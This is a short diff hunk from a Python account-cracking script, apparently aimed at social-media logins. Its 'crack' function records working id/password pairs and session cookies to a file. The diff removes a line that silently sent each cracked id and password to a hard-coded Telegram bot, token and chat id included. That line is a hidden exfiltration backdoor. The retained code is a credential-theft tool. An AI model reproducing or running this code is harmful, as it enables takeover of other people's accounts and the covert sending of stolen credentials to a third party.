@@ -957,7 +957,6 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                requests.get(f"https://api.telegram.org/bot6602510569:AAFQ5XG9FhOtXklo9riNScT9eQk4qPzRaio/sendMessage?chat_id=1716814575&text=\r {idf} | {pw}")
                 print(f'\r\x1b[32[RAWA-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki} | \033[1;32m{ua}')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 
